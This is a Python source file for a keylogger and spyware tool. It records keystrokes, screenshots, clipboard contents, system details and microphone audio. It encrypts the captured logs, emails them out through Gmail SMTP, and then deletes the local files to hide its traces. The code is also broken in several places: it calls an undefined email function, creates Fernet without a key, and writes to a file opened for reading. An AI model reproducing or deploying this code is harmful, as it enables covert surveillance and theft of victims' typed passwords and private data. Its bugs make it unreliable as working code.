from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import ssl
from app2 import password
from app2 import email
import os

keys_information = "key_log.txt"
system_information = "sysinfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "ss.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

email_sender = email
email_password = password
email_receiver = email


def sendEmail(filename, attachment, toaddr):
    subject = "Automated email"
    body = "This email is sent with python"

    em = MIMEMultipart()
    em['From'] = email_sender
    em['To'] = toaddr
    em['Subject'] = 'Log file'
    em.attach(MIMEMultipart(body, 'plain'))
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload(attachment.read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    em.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(email_sender, password)

    text = em.as_string()

    s.sendmail(email_sender, toaddr, text)

    s.quit()


email(keys_information, keys_information, email_receiver)

import socket
import platform


def sysInfo():
    with open(system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")


import win32clipboard


def clipBoard():
    with open(clipboard_information) as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")


from scipy.io.wavfile import write
import sounddevice as sd


def recordMic():
    fs = 44100
    seconds = 15
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(audio_information, fs, myrecording)


from multiprocessing import Process, freeze_support
from PIL import ImageGrab


def screenshot():
    img = ImageGrab.grab()
    img.save(screenshot_information)


from pynput.keyboard import Key, Listener

number_of_iterations = 0
number_of_iterations_end = 5

# Timer for keylogger
import time

currentTime = time.time()
time_iteration = 15
stoppingTime = time.time() + time_iteration
iterations = 0
end_iterations = 3
count = 0
keys = []

while iterations < end_iterations:
    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open('key_log.txt', "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        with open('key_log.txt', "w") as f:
            f.write(" ")

        screenshot()
        email(screenshot_information, screenshot_information, email_receiver)

        clipBoard()

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

from cryptography.fernet import Fernet

files_to_encrypt = [system_information, clipboard_information, keys_information]
encrypted_file_names = [system_information_e, clipboard_information_e, keys_information_e]

count = 0

for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet()  # * Generate key and put here
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    email(encrypted_file_names[count], encrypted_file_names[count], email_receiver)
    count += 1

time.sleep(120)

delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
for file in delete_files:
    os.remove(file)
